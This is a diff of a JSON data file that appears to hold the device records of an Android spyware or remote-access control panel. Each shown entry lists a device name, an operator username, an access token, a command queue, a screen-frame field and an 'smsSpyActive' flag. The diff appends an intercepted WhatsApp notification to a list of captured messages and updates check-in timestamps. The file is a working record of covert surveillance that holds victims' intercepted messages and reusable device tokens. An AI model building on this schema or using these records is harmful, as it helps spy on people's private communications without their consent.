@@ -4,7 +4,7 @@
     "deviceName": "HP-ABLO-F55F",
     "ownerUsername": "Zarr",
     "token": "7055f57f74cb7eef5034e3301d747b14",
-    "lastSeen": 1777787495654,
+    "lastSeen": 1777787498658,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-05-02T05:33:28.300Z",
@@ -52,6 +52,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "Memeriksa pesan baru",
+        "time": "03/05 12:51",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777787519210
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -4053,7 +4061,7 @@
     "deviceName": "HP-ABIR123-0330",
     "ownerUsername": "Fibersec",
     "token": "ab095dd2405dc78cf8aaa200b596d4bd",
-    "lastSeen": 1777787495608,
+    "lastSeen": 1777787516643,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-05-02T20:52:30.047Z",
